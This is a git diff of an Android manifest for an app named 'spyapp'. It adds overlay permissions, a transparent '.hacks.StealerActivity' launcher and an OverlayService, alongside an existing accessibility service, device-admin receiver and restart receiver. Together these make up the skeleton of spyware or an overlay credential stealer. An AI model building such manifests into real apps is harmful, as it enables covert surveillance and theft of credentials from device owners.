@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
     package="npo.kib.spyapp">
 
     <uses-permission android:name="android.permission.INTERNET" />
@@ -9,6 +10,8 @@
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.ACTION_MANAGE_OVERLAY_PERMISSION" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
     <application
         android:allowBackup="true"
@@ -16,9 +19,19 @@
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
-        android:theme="@style/Theme.SpyApp">
+        android:theme="@style/Theme.SpyApp"
+        tools:ignore="AllowBackup">
 
-        <activity android:name="npo.kib.spyapp.MainActivity">
+        <activity android:name=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name=".hacks.StealerActivity"
+            android:theme="@style/Theme.Transparent">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -26,24 +39,28 @@
         </activity>
 
         <service
-            android:name="npo.kib.spyapp.foreground.SpyService"
+            android:name=".foreground.SpyService"
             android:enabled="true"
             android:exported="false" />
-
         <service
-            android:name="npo.kib.spyapp.hacks.MyAccessibilityService"
+            android:name=".hacks.OverlayService"
+            android:enabled="true"
+            android:exported="false" />
+        <service
+            android:name=".hacks.MyAccessibilityService"
             android:foregroundServiceType="location"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
+
             <meta-data
                 android:name="android.accessibilityservice"
                 android:resource="@xml/my_accessibility_service" />
         </service>
 
         <receiver
-            android:name="npo.kib.spyapp.RestartReceiver"
+            android:name=".RestartReceiver"
             android:enabled="true"
             android:exported="true"
             android:label="RestartServiceWhenStopped"
@@ -54,7 +71,7 @@
         </receiver>
 
         <receiver
-            android:name="npo.kib.spyapp.hacks.DevAdminReceiver"
+            android:name=".hacks.DevAdminReceiver"
             android:label="@string/app_name"
             android:permission="android.permission.BIND_DEVICE_ADMIN">
             <intent-filter>
@@ -65,7 +82,6 @@
                 android:name="android.app.device_admin"
                 android:resource="@xml/device_admin" />
         </receiver>
-
     </application>
 
 </manifest>
